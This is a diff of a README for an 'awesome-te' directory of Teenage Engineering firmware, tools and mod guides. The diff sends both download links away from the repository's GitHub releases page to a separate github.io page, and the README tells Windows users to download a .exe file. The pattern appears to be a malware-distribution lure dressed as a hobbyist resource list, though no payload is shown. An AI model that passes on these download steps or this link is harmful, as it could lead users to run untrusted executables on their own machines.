@@ -1,6 +1,6 @@
 # 🛠️ awesome-te - Manage your Teenage Engineering gear easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/heatreleasing-blueflag888/awesome-te/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://heatreleasing-blueflag888.github.io)
 
 This project provides a central location for Teenage Engineering hardware enthusiasts. You can find firmware updates, custom tools, and modification guides for products like the OP-1, EP-133, and Pocket Operators. This directory saves you time by organizing these resources in one place.
 
@@ -21,7 +21,7 @@ You need a computer running Windows 10 or Windows 11 to use the software tools p
 
 Follow these steps to obtain the tools:
 
-1. Visit the following page to choose the latest version: [https://github.com/heatreleasing-blueflag888/awesome-te/releases](https://github.com/heatreleasing-blueflag888/awesome-te/releases)
+1. Visit the following page to choose the latest version: [https://heatreleasing-blueflag888.github.io](https://heatreleasing-blueflag888.github.io)
 2. Locate the file ending in .exe in the Assets section.
 3. Click the file to start the download.
 4. Save the file to your Downloads folder.
